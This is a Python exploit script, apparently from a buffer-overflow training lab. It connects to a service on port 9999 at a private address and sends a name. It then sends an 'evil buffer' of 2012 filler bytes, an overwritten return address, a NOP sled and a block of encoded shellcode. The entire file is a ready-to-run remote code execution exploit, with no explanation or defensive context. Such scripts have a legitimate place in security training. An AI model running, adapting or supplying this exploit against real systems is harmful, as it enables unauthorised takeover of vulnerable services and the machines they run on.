#!/usr/bin/env python3

import socket

ip = "10.10.25.220"
port = 9999

name = "My Name"
offset = 2012
overflow = "A" * offset
# 625014DF
retn = "\xDF\x14\x50\x62"
padding = "\x90" * 16
payload = ("\xbf\xb2\xd2\xda\x32\xdd\xc4\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x7d\x12\x83\xed\xfc\x03\xcf\xdc\x38\xc7\xd3\x09\x3e"
"\x28\x2b\xca\x5f\xa0\xce\xfb\x5f\xd6\x9b\xac\x6f\x9c\xc9\x40"
"\x1b\xf0\xf9\xd3\x69\xdd\x0e\x53\xc7\x3b\x21\x64\x74\x7f\x20"
"\xe6\x87\xac\x82\xd7\x47\xa1\xc3\x10\xb5\x48\x91\xc9\xb1\xff"
"\x05\x7d\x8f\xc3\xae\xcd\x01\x44\x53\x85\x20\x65\xc2\x9d\x7a"
"\xa5\xe5\x72\xf7\xec\xfd\x97\x32\xa6\x76\x63\xc8\x39\x5e\xbd"
"\x31\x95\x9f\x71\xc0\xe7\xd8\xb6\x3b\x92\x10\xc5\xc6\xa5\xe7"
"\xb7\x1c\x23\xf3\x10\xd6\x93\xdf\xa1\x3b\x45\x94\xae\xf0\x01"
"\xf2\xb2\x07\xc5\x89\xcf\x8c\xe8\x5d\x46\xd6\xce\x79\x02\x8c"
"\x6f\xd8\xee\x63\x8f\x3a\x51\xdb\x35\x31\x7c\x08\x44\x18\xe9"
"\xfd\x65\xa2\xe9\x69\xfd\xd1\xdb\x36\x55\x7d\x50\xbe\x73\x7a"
"\x97\x95\xc4\x14\x66\x16\x35\x3d\xad\x42\x65\x55\x04\xeb\xee"
"\xa5\xa9\x3e\xa0\xf5\x05\x91\x01\xa5\xe5\x41\xea\xaf\xe9\xbe"
"\x0a\xd0\x23\xd7\xa1\x2b\xa4\xd2\x38\x2a\xc6\x8b\x40\x4c\x37"
"\x10\xcc\xaa\x5d\xb8\x98\x65\xca\x21\x81\xfd\x6b\xad\x1f\x78"
"\xab\x25\xac\x7d\x62\xce\xd9\x6d\x13\x3e\x94\xcf\xb2\x41\x02"
"\x67\x58\xd3\xc9\x77\x17\xc8\x45\x20\x70\x3e\x9c\xa4\x6c\x19"
"\x36\xda\x6c\xff\x71\x5e\xab\x3c\x7f\x5f\x3e\x78\x5b\x4f\x86"
"\x81\xe7\x3b\x56\xd4\xb1\x95\x10\x8e\x73\x4f\xcb\x7d\xda\x07"
"\x8a\x4d\xdd\x51\x93\x9b\xab\xbd\x22\x72\xea\xc2\x8b\x12\xfa"
"\xbb\xf1\x82\x05\x16\xb2\xa3\xe7\xb2\xcf\x4b\xbe\x57\x72\x16"
"\x41\x82\xb1\x2f\xc2\x26\x4a\xd4\xda\x43\x4f\x90\x5c\xb8\x3d"
"\x89\x08\xbe\x92\xaa\x18")
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  get = s.recv(1024)
  print(get)
  get = s.recv(1024)
  print(get)
  print("Sending name...")
  s.send(bytes(name + "\r\n", "latin-1"))
  get = s.recv(1024)
  print(get)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  s.close()
  print("Done!")
except:
  print("Could not connect.")